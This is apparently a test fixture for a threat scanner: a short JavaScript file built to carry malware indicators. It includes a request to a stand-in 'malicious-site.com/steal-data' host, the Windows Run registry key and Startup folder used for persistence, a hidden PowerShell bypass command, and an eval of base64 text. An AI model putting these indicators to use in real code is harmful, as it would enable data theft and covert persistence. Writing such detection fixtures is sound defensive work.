// This is a suspicious JavaScript file for testing
function maliciousFunction() {
    // Simulate suspicious behavior
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://malicious-site.com/steal-data', true);
    
    // Registry manipulation simulation
    var registry = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
    
    // Command execution simulation
    var cmd = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass";
    
    // File system access
    var autorun = "C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
    
    return "This script contains multiple threat indicators";
}

// Obfuscated code pattern
eval(atob("dGhpcyBpcyBvYmZ1c2NhdGVkIGNvZGU="));
